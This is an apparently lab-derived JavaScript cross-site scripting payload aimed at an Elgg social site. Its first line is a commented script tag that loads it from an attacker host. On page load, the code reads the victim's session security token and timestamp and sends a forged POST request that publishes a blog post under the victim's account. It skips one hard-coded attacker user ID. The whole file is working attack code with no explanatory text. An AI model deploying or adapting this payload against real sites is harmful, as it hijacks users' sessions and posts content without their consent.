//<script type="text/javascript" src="http://www.xsslabattacker.com/blog_post.js"></script>


window.onload = function () {
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var title = "&title=One True Sentence";
    var description = "&description=<p>Sam is the one true king</p> &tags=&comments_on=On&access_id=2&status=published&guid=&container_guid=" + elgg.session.user.guid + "&save=Save";
    var accesslevel = "&access_id=2";
    var status = "&status=published";
    var container_guid = "&container_guid=" + elgg.session.user.guid;
    var save = "&save=Save";





    //Construct the content of your url.
    var content = token + ts + title + "&excerpt=" + description;
    var samyGuid = 47;
    var sendurl = "http://www.xsslabelgg.com/action/blog/save";
    if (elgg.session.user.guid != samyGuid) {
        //Create and send Ajax request to modify profile
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}